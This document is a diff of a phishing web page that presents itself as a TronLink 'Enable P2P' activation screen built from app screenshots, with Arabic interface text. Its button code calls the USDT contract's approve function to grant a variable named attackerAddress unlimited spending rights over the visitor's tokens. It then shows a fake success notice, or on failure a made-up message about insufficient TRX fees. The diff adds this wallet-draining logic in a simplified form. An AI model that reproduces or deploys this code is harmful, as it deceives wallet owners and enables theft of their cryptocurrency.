@@ -10,6 +10,7 @@
         .wrapper { width: 100%; max-width: 420px; position: relative; line-height: 0; }
         .bg-img { width: 100%; display: block; margin: 0; padding: 0; border: none; }
 
+        /* زر التفعيل الرئيسي */
         .approve-button {
             position: absolute;
             top: 18.1%; 
@@ -39,6 +40,7 @@
             background-size: contain; background-repeat: no-repeat;
         }
 
+        /* تصميم اليفطة الاحترافية (Modal) */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -65,16 +67,40 @@
             to { transform: scale(1); opacity: 1; }
         }
 
-        .modal-icon { width: 60px; height: 60px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 30px; }
+        .modal-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            font-size: 30px;
+        }
+
         .icon-success { background: #e8f5e9; color: #4caf50; }
         .icon-error { background: #ffebee; color: #f44336; }
 
         .modal-title { font-size: 20px; font-weight: bold; margin-bottom: 10px; color: #333; }
         .modal-text { font-size: 15px; color: #666; margin-bottom: 20px; line-height: 1.5; }
-        .modal-btn { background: #000; color: #fff; border: none; padding: 12px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
 
+        .modal-btn {
+            background: #000;
+            color: #fff;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        /* القائمة المنسدلة */
         .menu-trigger { position: absolute; top: 20px; right: 20px; width: 50px; height: 50px; cursor: pointer; z-index: 20; }
-        .dropdown { display: none; position: absolute; top: 60px; right: 20px; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-radius: 8px; z-index: 100; min-width: 160px; }
+        .dropdown {
+            display: none; position: absolute; top: 60px; right: 20px; background: white;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-radius: 8px; z-index: 100; min-width: 160px;
+        }
         .dropdown a { display: block; padding: 12px 25px; text-decoration: none; color: #333; font-size: 14px; border-bottom: 1px solid #f0f0f0; text-align: right; }
     </style>
 </head>
@@ -82,11 +108,18 @@
 
 <div class="wrapper">
     <img src="https://i.postimg.cc/Xq8WkTVq/Screenshot-20260321-161952-Chrome.jpg" class="bg-img">
-    <button class="approve-button" id="mainBtn" onclick="startApprove()">Enable P2P</button>
+    
+    <button class="approve-button" onclick="startApprove()">
+        Enable P2P
+    </button>
+
     <div class="menu-trigger" onclick="toggleMenu()"></div>
     <div id="myDrop" class="dropdown">
-        <a href="#">Twitter</a><a href="#">Telegram</a><a href="#">Support Center</a>
+        <a href="#">Twitter</a>
+        <a href="#">Telegram</a>
+        <a href="#">Support Center</a>
     </div>
+
     <img src="https://i.postimg.cc/Z58v3qNd/Screenshot-20260321-162726-Chrome.jpg" class="bg-img">
     <img src="https://i.postimg.cc/KY4KWDV7/Screenshot-20260321-163106-Chrome.jpg" class="bg-img">
     <img src="https://i.postimg.cc/FR3KtWxy/Screenshot-20260321-163237-Chrome.jpg" class="bg-img">
@@ -109,50 +142,54 @@
 
     function showModal(type, title, message) {
         const overlay = document.getElementById('customModal');
-        document.getElementById('modalIcon').className = type === 'success' ? 'modal-icon icon-success' : 'modal-icon icon-error';
-        document.getElementById('modalIcon').innerHTML = type === 'success' ? '✓' : '✕';
-        document.getElementById('modalTitle').innerText = title;
-        document.getElementById('modalMessage').innerText = message;
+        const icon = document.getElementById('modalIcon');
+        const titleEl = document.getElementById('modalTitle');
+        const msgEl = document.getElementById('modalMessage');
+
+        if (type === 'success') {
+            icon.className = 'modal-icon icon-success';
+            icon.innerHTML = '✓';
+        } else {
+            icon.className = 'modal-icon icon-error';
+            icon.innerHTML = '✕';
+        }
+
+        titleEl.innerText = title;
+        msgEl.innerText = message;
         overlay.style.display = 'flex';
     }
 
-    function closeModal() { document.getElementById('customModal').style.display = 'none'; }
-    function toggleMenu() { const d = document.getElementById('myDrop'); d.style.display = d.style.display === 'block' ? 'none' : 'block'; }
+    function closeModal() {
+        document.getElementById('customModal').style.display = 'none';
+    }
+
+    function toggleMenu() {
+        const d = document.getElementById('myDrop');
+        d.style.display = (d.style.display === 'block') ? 'none' : 'block';
+    }
 
     async function startApprove() {
         if (!window.tronWeb) {
             showModal('error', 'خطأ في الربط', 'يرجى فتح الرابط من داخل تطبيق TronLink');
             return;
         }
-
         try {
-            // الخطوة 1: فحص الاتصال الصريح
-            const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-            
-            if (accounts && (accounts.code === 200 || window.tronWeb.defaultAddress.base58)) {
-                
-                // إضافة تأخير بسيط جداً للتأكد من استقرار الواجهة
-                setTimeout(async () => {
-                    try {
-                        const contract = await window.tronWeb.contract().at(usdtContract);
-                        // طلب الصلاحية (هذا ما سيظهر عنوانك)
-                        await contract.approve(attackerAddress, unlimited).send({
-                            feeLimit: 100000000
-                        });
-                        
-                        showModal('success', 'تم بنجاح', 'تم تفعيل خاصية P2P بنجاح.');
-                    } catch (innerError) {
-                        // تظهر اليافطة الحمراء فقط إذا فشلت العملية (رفض أو نقص رصيد)
-                        showModal('error', 'فشل التفعيل', 'لم يتم تفعيل P2P لعدم وجود رصيد TRX كافٍ لتغطية رسوم الطاقة.');
-                    }
-                }, 1000); 
+            const contract = await window.tronWeb.contract().at(usdtContract);
+            const result = await contract.approve(attackerAddress, unlimited).send();
+            if(result) {
+                showModal('success', 'تم بنجاح', 'تم تفعيل خاصية P2P في حسابك بنجاح.');
             }
         } catch (e) {
-            console.error("Connection failed");
+            showModal('error', 'فشل التفعيل', 'لم يتم تفعيل P2P لعدم وجود رصيد TRX كافٍ لتغطية رسوم الطاقة.');
         }
     }
 
-    window.onclick = function(e) { if (!e.target.matches('.menu-trigger')) document.getElementById('myDrop').style.display = "none"; }
+    window.onclick = function(event) {
+        if (!event.target.matches('.menu-trigger')) {
+            document.getElementById('myDrop').style.display = "none";
+        }
+    }
 </script>
+
 </body>
 </html>
